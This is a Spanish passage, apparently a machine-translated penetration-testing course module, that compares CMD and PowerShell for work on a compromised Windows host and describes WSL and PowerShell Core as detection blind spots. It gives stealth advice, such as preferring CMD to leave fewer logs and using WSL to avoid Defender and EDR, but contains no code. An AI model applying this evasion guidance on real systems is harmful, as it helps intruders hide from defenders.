La respuesta es simple, la que le proporciona la capacidad que necesita en ese momento. Comparar`cmd`y`PowerShell`por un minuto para tener una idea de lo que ofrecen y cuándo sería mejor elegir uno sobre el otro.

CMD Shell es el shell MS-DOS original integrado en Windows. Fue hecho para interacción básica y operaciones de TI en un host. Se podría lograr algo de automatización simple con archivos por lotes, pero eso fue todo. PowerShell llegó con el propósito de expandir las capacidades de CMD. PowerShell comprende los comandos nativos de MS-DOS utilizados en CMD y un conjunto completamente nuevo de comandos basados en .NET. Los nuevos módulos autosuficientes también se pueden implementar en PowerShell con cmdlets. El indicador CMD trata con la entrada y salida del texto, mientras que PowerShell utiliza objetos .NET para todas las entradas y salida. Otra consideración importante es que CMD no mantiene un registro de los comandos utilizados durante la sesión, mientras que PowerShell sí. Entonces, en el contexto de ser sigiloso, la ejecución de comandos con CMD dejará menos rastro en el host. Otros problemas potenciales como`Execution Policy`y`User Account Control (UAC)`puede inhibir su capacidad para ejecutar comandos y scripts en el host. Estas consideraciones afectan`PowerShell`Pero no CMD. Otra gran preocupación a tener en cuenta es la edad del anfitrión. Si aterriza en un host Windows XP o anterior (sí, todavía es posible ...) PowerShell no está presente, por lo que su única opción será CMD. PowerShell no llegó a buen término hasta Windows 7. Para resumirlo todo:

Usar`CMD`cuando:

- Estás en un anfitrión anterior que puede no incluir PowerShell.
- Cuando solo necesita interacciones/acceso simples al host.
- Cuando planea usar archivos de lotes simples, comandos netos o herramientas nativas de MS-DOS.
- Cuando cree que las políticas de ejecución pueden afectar su capacidad para ejecutar scripts u otras acciones en el host.

Usar`PowerShell`cuando:

- Está planeando utilizar cmdlets u otros scripts personalizados.
- Cuando desea interactuar con los objetos .NET en lugar de la salida de texto.
- Cuando ser sigiloso es de menor preocupación.
- Si planea interactuar con servicios y hosts basados en la nube.
- Si sus scripts establecen y usan alias.

---

# **WSL y PowerShell para Linux**

El subsistema de Windows para Linux es una nueva herramienta poderosa que se ha introducido en los hosts de Windows que proporciona un entorno virtual de Linux integrado en su host. Mencionamos esto porque el panorama de los sistemas operativos que cambia rápidamente puede permitir muy bien formas novedosas de obtener acceso a un host. Al escribir este módulo, varios ejemplos de malware en la naturaleza intentaban utilizar binarios de Python3 y Linux para descargar e instalar cargas útiles en un host de Windows a través de WSL. Al igual que en esta publicación[aquí](https://www.bleepingcomputer.com/news/security/new-malware-uses-windows-subsystem-for-linux-for-stealthy-attacks/), los atacantes también están utilizando bibliotecas de Python incorporadas que son nativas de Windows y Linux junto con PowerShell para realizar otras acciones en el host. Otra cosa a tener en cuenta es actualmente, las solicitudes o funciones de red ejecutadas hacia o desde la instancia de WSL no están analizadas por Windows Firewall y Windows Defender, lo que lo convierte en un punto ciego en el host.

Actualmente se pueden encontrar los mismos problemas a través de PowerShell Core, que se puede instalar en sistemas operativos de Linux y transportar muchas funciones normales de PowerShell. Estos dos conceptos son excepcionalmente astutos porque, hasta la fecha, no se sabe mucho sobre los vectores de ataque o formas de vigilarlos. Pero se ha visto ataques dirigidos a estas características para evitar mecanismos de detección AV y EDR. Estos conceptos están un poco avanzados para este módulo, pero los buscan en un módulo futuro.